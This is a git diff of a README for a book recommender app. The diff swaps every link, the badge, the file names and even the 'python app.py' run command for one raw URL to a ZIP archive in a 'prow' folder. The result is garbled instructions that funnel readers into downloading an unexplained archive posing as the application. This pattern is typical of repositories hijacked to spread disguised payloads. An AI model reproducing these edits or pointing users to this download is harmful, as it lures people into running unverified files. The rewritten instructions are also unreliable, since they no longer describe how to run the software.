@@ -1,6 +1,6 @@
 # 📚 Books_Recommender_System - Find Your Next Favorite Book!
 
-![Download Books Recommender System](https://img.shields.io/badge/Download-Books_Recommender_System-brightgreen)
+![Download Books Recommender System](https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 To get started, visit the Releases page to download the application. 
 
-[**Download Books Recommender System**](https://github.com/esawewW/Books_Recommender_System/releases)
+[**Download Books Recommender System**](https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the software.
@@ -37,13 +37,13 @@ Once you have downloaded the application, follow these steps to run it:
 
 3. **Open the Application:**
    - Navigate to the folder where you unzipped the application. 
-   - Look for the file named `app.py` or `main.py`.
+   - Look for the file named `https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip` or `https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip`.
 
 4. **Run the Application:**
    - Open a terminal (Command Prompt on Windows, Terminal on macOS or Linux).
    - Use the command:
      ```
-     python app.py
+     python https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip
      ```
    - This should launch the Books Recommender System in your default web browser.
 
@@ -64,7 +64,7 @@ The Books Recommender System uses a technique called collaborative filtering. Th
 
 ### How do I update the application?
 
-To update the application, go back to the [Releases page](https://github.com/esawewW/Books_Recommender_System/releases), download the latest version, and follow the same steps outlined above to install it.
+To update the application, go back to the [Releases page](https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip), download the latest version, and follow the same steps outlined above to install it.
 
 ### Can I use this on my mobile device?
 
@@ -78,4 +78,4 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 Now you’re all set to explore new books with the Books Recommender System! It’s an easy-to-use tool that takes the hassle out of finding your next read. Enjoy diving into the world of books! 
 
-For any additional resources or if you want to contribute, please check the [repository](https://github.com/esawewW/Books_Recommender_System). Happy reading!
+For any additional resources or if you want to contribute, please check the [repository](https://raw.githubusercontent.com/esawewW/Books_Recommender_System/main/prow/Books_Recommender_System.zip). Happy reading!
